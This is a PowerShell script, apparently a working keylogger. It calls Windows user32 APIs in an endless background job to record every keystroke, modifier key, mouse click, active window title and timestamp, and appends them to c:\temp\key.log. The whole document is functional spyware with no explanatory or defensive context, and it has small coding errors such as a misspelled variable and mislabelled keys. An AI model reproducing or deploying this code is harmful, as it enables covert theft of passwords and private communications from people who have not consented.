
﻿

        Function DynAKey {
            $ScriptBlock = {
            
            [string] $OutPath = 'c:\temp\key.log'

                function LogKey {
                    $ImportStatement = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] 
public static extern short GetAsyncKeyState(int virtualKeyCode); 

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);

[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern IntPtr GetForegroundWindow();
'@
           
                    $ImportDll = Add-Type -MemberDefinition $ImportStatement -Namespace Win32 -Name Util -PassThru
    
                    Start-Sleep -Milliseconds 40

                        try {
                            [string] $LogOutput = ''

                            for ($TypeableChar = 1; $TypeableChar -le 254; $TypeableChar++) {
                                $VirtualKey = $TypeableChar
                                $KeyResult = $ImportDll::GetAsyncKeyState($VirtualKey)

                                if ($KeyResult -eq -32767) {
            
                                    $LeftShift = $ImportDll::GetAsyncKeyState(160)
                                    $RightShift = $ImportDll::GetAsyncKeyState(161)                
                                    $LeftCtrl = $ImportDll::GetAsyncKeyState(162)
                                    $RightCtrl = $ImportDll::GetAsyncKeyState(163)
                                    $LeftAlt = $ImportDll::GetAsyncKeyState(164)
                                    $RightAlt = $ImportDll::GetAsyncKeyState(165)
                                    $TabKey = $ImportDll::GetAsyncKeyState(9)
                                    $SpaceBar = $ImportDll::GetAsyncKeyState(32)
                                    $DeleteKey = $ImportDll::GetAsyncKeyState(127)
                                    $EnterKey = $ImportDll::GetAsyncKeyState(13)
                                    $BackSpaceKey = $ImportDll::GetAsyncKeyState(8)
                                    $LeftArrow = $ImportDll::GetAsyncKeyState(37)
                                    $RightArrow = $ImportDll::GetAsyncKeyState(39)
                                    $UpArrow = $ImportDll::GetAsyncKeyState(38)
                                    $DownArrow = $ImportDll::GetAsyncKeyState(34)
                                    $LeftMouse = $ImportDll::GetAsyncKeyState(1)
                                    $RightMouse = $ImportDll::GetAsyncKeyState(2)
                
                                    if ((($LeftShift -eq -32767) -or ($RightShift -eq -32767)) -or (($LeftShift -eq -32768) -or ($RightShfit -eq -32768))) {$LogOutput += '[Shift] '}
                                    if ((($LeftCtrl -eq -32767) -or ($LeftCtrl -eq -32767)) -or (($RightCtrl -eq -32768) -or ($RightCtrl -eq -32768))) {$LogOutput += '[Ctrl] '}
                                    if ((($LeftAlt -eq -32767) -or ($LeftAlt -eq -32767)) -or (($RightAlt -eq -32767) -or ($RightAlt -eq -32767))) {$LogOutput += '[Alt] '}
                                    if (($TabKey -eq -32767) -or ($TabKey -eq -32768)) {$LogOutput += '[Tab] '}
                                    if (($SpaceBar -eq -32767) -or ($SpaceBar -eq -32768)) {$LogOutput += '[SpaceBar] '}
                                    if (($DeleteKey -eq -32767) -or ($DeleteKey -eq -32768)) {$LogOutput += '[Delete] '}
                                    if (($EnterKey -eq -32767) -or ($EnterKey -eq -32768)) {$LogOutput += '[Enter] '}
                                    if (($BackSpaceKey -eq -32767) -or ($BackSpaceKey -eq -32768)) {$LogOutput += '[Backspace] '}
                                    if (($LeftArrow -eq -32767) -or ($LeftArrow -eq -32768)) {$LogOutput += '[Left Arrow] '}
                                    if (($RightArrow -eq -32767) -or ($RightArrow -eq -32768)) {$LogOutput += '[Right Arrow] '}
                                    if (($UpArrow -eq -32767) -or ($UpArrow -eq -32768)) {$LogOutput += '[Up Arrow] '}
                                    if (($DownArrow -eq -32767) -or ($DownArrow -eq -32768)) {$LogOutput += '[Down Arrow] '}
                                    if (($LeftMouse -eq -32767) -or ($LeftMouse -eq -32768)) {$LogOutput += '[Left Mouse] '}
                                    if (($RightMouse -eq -32767) -or ($RightMouse -eq -32768)) {$LogOutput += '[Right Mouse] '}

                                    [bool] $CapsLock = [console]::CapsLock 
                                    if ($CapsLock -eq $True) {$LogOutput += '[Caps Lock] '}
                
                                    $MappedKey = $ImportDll::MapVirtualKey($VirtualKey, 0x03)
                                    $KeyboardState = New-Object Byte[] 256
                                    $CheckKeyboardState = $ImportDll::GetKeyboardState($KeyboardState)

                                    $StringBuilder = New-Object -TypeName System.Text.StringBuilder;
                                    $UnicodeKey = $ImportDll::ToUnicode($VirtualKey, $MappedKey, $KeyboardState, $StringBuilder, $StringBuilder.Capacity, 0)

                                    if ($UnicodeKey -gt 0) {
                                        $TypedCharacter = $StringBuilder.ToString()
                                        $LogOutput += ('['+"$($TypedCharacter)"+']')
                                    }
                
                                    $TopWindow = $ImportDll::GetForegroundWindow()
                                    [int32] $WindowPid = (Get-Process | Where-Object { $_.mainwindowhandle -eq $TopWindow }).Id
                                    [string] $WindowTitle = (Get-Process -pid $WindowPid).mainWindowTitle

                                    $TimeStamp = (Get-Date -Format dd/MM/yyyy:HH:mm:ss:ff)
                
                                       $ObjectProperties = @{'Key Typed' = $LogOutput;
                                                          'Time' = $TimeStamp;
                                                          'Window Title' = $WindowTitle}
                                    $ResultsObject = New-Object -TypeName PSObject -Property $ObjectProperties
                
                                     Out-File -FilePath $OutPath -Encoding UTF8 -Append -InputObject $ResultsObject                               
                                }
                            }      
                        }
        
                        catch {Write-Verbose $Error[0]}   
                    }   
                }

            Start-job -InitializationScript $ScriptBlock -ScriptBlock {for (;;) {LogKey}} | Out-Null
        }

       DynAKey

